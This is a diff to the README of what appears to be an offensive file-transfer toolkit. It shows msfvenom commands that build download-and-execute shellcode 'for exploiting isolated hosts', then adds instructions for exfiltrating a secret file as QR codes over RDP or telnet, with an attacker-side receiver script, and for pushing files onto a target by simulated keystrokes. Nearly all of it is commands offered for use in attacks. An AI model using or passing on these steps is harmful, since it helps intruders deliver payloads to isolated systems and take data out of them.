@@ -34,3 +34,34 @@ It can be used as dns-shellcode alternative for exploiting isolated hosts:
 msfvenom -p windows/exec CMD=$(cat dns_download_exec.bat) -f raw -o dns_shellcode
 msfvenom -p linux/x86/exec CMD=$(cat dns_download_exec.sh) -f raw -o dns_shellcode
 ```
+
+### QR exfiltration (File upload)
+For RDP (windows):
+```
+cl /c lib\qrcodegen.c
+cl /c qr_upload.c
+link /out:qr_upload.exe qr_upload.obj qrcodegen.obj
+chcp 866
+set TIMEOUT=1000
+set SIZE=100
+qr_upload.exe c:\path\to\secret.bin
+```
+For telnet (routers, etc):
+```
+gcc -c lib/qrcodegen.c
+gcc -c qr_upload.c
+gcc qr_upload.c qrcodegen.o -o qr_upload
+setterm -background white
+setterm -foreground black
+TIMEOUT=1000 SIZE=100 ./qr_upload /path/to/secret.bin
+```
+Attacker side:
+`./qr_download.py`
+
+### Sendkeys (File download)
+If nothing works you can always fill text (universal):
+```
+setxkbmap us
+cat /tmp/test.txt | ./text_send.sh
+cat /tmp/test.bin | base64 | ./text_send.sh
+```
